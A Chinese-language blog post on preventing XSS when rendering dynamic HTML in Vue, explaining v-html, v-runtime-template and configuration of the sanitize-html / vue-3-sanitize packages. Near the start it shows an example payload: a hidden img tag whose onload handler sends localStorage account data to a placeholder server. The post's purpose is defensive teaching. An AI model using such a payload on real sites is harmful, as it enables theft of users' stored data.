---
title: Vue Dynamic HTML Prevent XSS
date: 2022-06-26 23:39:36
tags:
  - Vue
  - v-html
  - v-sanitize
  - v-runtime-template
---

在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得

使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack

我曾經遇過公司 有駭客入侵將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況(被導走到其他頁面)

(ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊)

可以參考這篇
[Vue XSS Attack Guide](https://www.stackhawk.com/blog/vue-xss-guide-examples-and-prevention/#injecting-the-malicious-script)

舉例來說我們可以透過隱藏的圖片發送 request 給 駭客的 Server 並且偷取到對應的 Cookie or Session ....

```html
<img
  src="xxxx"
  style="display:none"
  onload="fetch('https://test.api/', {method: 'POST', body: localStorage.getItem('account')})"
/>
```

這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異
| Plugnin | Support | different | |
|--------------------|--------|--- --------|---|
| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |
| v-runtime-template | 支援 vue custom component & variabe (需事先定義好) | 無法防止 XSS attack |

可能大家沒有感覺 那我們先來看以下範例
如果沒有透過過濾不合法的 tag 在上面的 Demo 內 會出現什麼呢?

1. xss 的 alert
2. 非法的 iframe (假設我們沒有規定 iframe 是可以出現的)

[DEMO](https://codesandbox.io/s/dynamic-template-yvfx0n)

接下來我們介紹今天的主角 Sanitize html

[sanitize html](https://github.com/apostrophecms/sanitize-html)
在 Vue 3 裡面可以用[vue-3-sanitize](https://github.com/vannsl/vue-3-sanitize)

套件

我們這裡可以透過此套件將 HTML 不合法的 TAG 或是相對應的 TAG 做一些限制以及過濾
這裡列出兩大項

1. 限制動態 HTML 的 TAG

Default options

```javascript
allowedTags: [
  "address", "article", "aside", "footer", "header", "h1", "h2", "h3", "h4",
  "h5", "h6", "hgroup", "main", "nav", "section", "blockquote", "dd", "div",
  "dl", "dt", "figcaption", "figure", "hr", "li", "main", "ol", "p", "pre",
  "ul", "a", "abbr", "b", "bdi", "bdo", "br", "cite", "code", "data", "dfn",
  "em", "i", "kbd", "mark", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp",
  "small", "span", "strong", "sub", "sup", "time", "u", "var", "wbr", "caption",
  "col", "colgroup", "table", "tbody", "td", "tfoot", "th", "thead", "tr"
],
disallowedTagsMode: 'discard',
allowedAttributes: {
  a: [ 'href', 'name', 'target' ],
  // We don't currently allow img itself by default, but
  // these attributes would make sense if we did.
  img: [ 'src', 'srcset', 'alt', 'title', 'width', 'height', 'loading' ]
},
// Lots of these won't come up by default because we don't allow them
selfClosing: [ 'img', 'br', 'hr', 'area', 'base', 'basefont', 'input', 'link', 'meta' ],
// URL schemes we permit
allowedSchemes: [ 'http', 'https', 'ftp', 'mailto', 'tel' ],
allowedSchemesByTag: {},
allowedSchemesAppliedToAttributes: [ 'href', 'src', 'cite' ],
allowProtocolRelative: true,
enforceHtmlBoundary: false
```

2. 限制 CSS & Script & iframe 語法

```javascript
const clean = sanitizeHtml(
  '<script src="https://www.safe.authorized.com/lib.js"></script>',
  {
    allowedTags: ['script'],
    allowedAttributes: {
      script: ['src'],
    },
    allowedScriptDomains: ['authorized.com'],
  }
);
```

```css
onst clean = sanitizeHtml(dirty, {
        allowedTags: ['p'],
        allowedAttributes: {
          'p': ["style"],
        },
        allowedStyles: {
          '*': {
            // Match HEX and RGB
            'color': [/^#(0x)?[0-9a-f]+$/i, /^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/],
            'text-align': [/^left$/, /^right$/, /^center$/],
            // Match any number with px, em, or %
            'font-size': [/^\d+(?:px|em|%)$/]
          },
          'p': {
            'font-size': [/^\d+rem$/]
          }
        }
      });
```

根據上面的設定後

可以對照[DEMO](https://codesandbox.io/s/dynamic-template-yvfx0n)
透過 sanitize 過濾掉有問題的語法 避免 XSS 攻擊

```javascript
this.$sanitize(this.message);
```

### 範例

那如果像剛剛這樣 假設我們想要允許特定 Domain 的 iframe 要怎麼辦呢

我們可以透過 OverideOption 將特定的 domain & tag 掛上去 這樣就可以避免 User 掛載一些奇怪的 Domain

```javascript
const overridenOptions = {
  allowedTags: ['iframe'],
  allowedAttributes: {
    iframe: ['src'],
  },
  allowedIframeHostnames: ['www.youtube.com'],
};
```

因為靜態檔案最容易被人動手腳 尤其是系統一大 檔案一多不會有人時時刻刻去檢查...就需要有這種檢查幫助我們去過濾語法

# Reference

[XSS(Cross site scripting) 簡單範例](https://ithelp.ithome.com.tw/articles/10238479)
[XSS Sample](https://www.softwaretestinghelp.com/cross-site-scripting-xss-attack-test/)
[Vue 3 Sanitize](https://github.com/vannsl/vue-3-sanitize)
